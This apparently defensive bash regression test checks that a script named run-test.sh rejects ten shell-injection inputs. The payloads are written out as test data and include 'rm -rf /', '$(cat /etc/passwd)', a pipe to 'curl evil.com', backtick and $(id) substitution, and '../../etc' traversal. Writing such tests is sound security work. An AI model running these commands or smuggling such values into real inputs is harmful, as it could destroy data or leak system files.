#!/usr/bin/env bash
# bin/testing/test-injection.sh — T-126: Regression test for shell injection prevention
#
# Tests that run-test.sh rejects all injection variants.
# All 10 payloads MUST be rejected with exit code 1 and an error message.
#
# Usage:
#   ./bin/testing/test-injection.sh
#
# Returns exit code 0 if all injections are rejected, 1 if any bypass is detected.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/../.." && pwd)"
RUN_TEST="${ROOT_DIR}/bin/run-test.sh"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; RESET='\033[0m'

PASS=0; FAIL=0

# ── Test runner ───────────────────────────────────────────────────────────────
# Expects the script to EXIT NON-ZERO and print an error.
# Any exit code 0 (bypass) is a test FAILURE.
expect_rejected() {
  local label="$1"; shift
  local output exit_code

  output=$("${RUN_TEST}" "$@" 2>&1) || exit_code=$?
  exit_code="${exit_code:-0}"

  if [[ "${exit_code}" -ne 0 ]] && echo "${output}" | grep -qiE "invalid|traversal|not allowed|cannot|rejected|error"; then
    echo -e "  ${GREEN}[PASS]${RESET} ${label}"
    PASS=$((PASS + 1))
  elif [[ "${exit_code}" -ne 0 ]]; then
    # Non-zero exit but no error message — still a reject, acceptable
    echo -e "  ${GREEN}[PASS]${RESET} ${label} (rejected without message)"
    PASS=$((PASS + 1))
  else
    echo -e "  ${RED}[FAIL]${RESET} ${label} — injection was NOT rejected! (exit 0)"
    FAIL=$((FAIL + 1))
  fi
}

echo ""
echo -e "${BOLD}  T-126: Shell Injection Regression Tests${RESET}"
echo -e "  ─────────────────────────────────────────"
echo ""

# ── --client injection payloads ───────────────────────────────────────────────
expect_rejected "client: semicolon injection" \
  --client "test; rm -rf /" --scenario "api/smoke" --profile smoke

expect_rejected "client: command substitution \$()" \
  --client "\$(cat /etc/passwd)" --scenario "api/smoke" --profile smoke

expect_rejected "client: pipe injection" \
  --client "test | curl evil.com" --scenario "api/smoke" --profile smoke

expect_rejected "client: backtick injection" \
  --client 'test`id`' --scenario "api/smoke" --profile smoke

expect_rejected "client: path traversal .." \
  --client "../../etc" --scenario "api/smoke" --profile smoke

# ── --scenario injection payloads ────────────────────────────────────────────
expect_rejected "scenario: semicolon injection" \
  --client "_reference" --scenario "api/test; rm -rf /" --profile smoke

expect_rejected "scenario: command substitution" \
  --client "_reference" --scenario 'api/\$(id)' --profile smoke

# ── --profile injection payloads ─────────────────────────────────────────────
expect_rejected "profile: semicolon injection" \
  --client "_reference" --scenario "api/smoke-users" --profile "smoke; evil"

expect_rejected "profile: unknown profile name" \
  --client "_reference" --scenario "api/smoke-users" --profile "superevilprofile"

# ── --env injection payloads ──────────────────────────────────────────────────
expect_rejected "env: special characters" \
  --client "_reference" --scenario "api/smoke-users" --profile smoke --env 'staging$(id)'

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo -e "  ─────────────────────────────────────────"
TOTAL=$((PASS + FAIL))
echo -e "  Results: ${GREEN}${PASS} passed${RESET} / ${RED}${FAIL} failed${RESET} / ${TOTAL} total"
echo ""

if [[ "${FAIL}" -gt 0 ]]; then
  echo -e "  ${RED}${BOLD}FAIL — ${FAIL} injection(s) were not properly rejected!${RESET}"
  echo -e "  Review validate_input() in bin/run-test.sh"
  exit 1
fi

echo -e "  ${GREEN}${BOLD}PASS — All injection variants rejected correctly.${RESET}"
exit 0
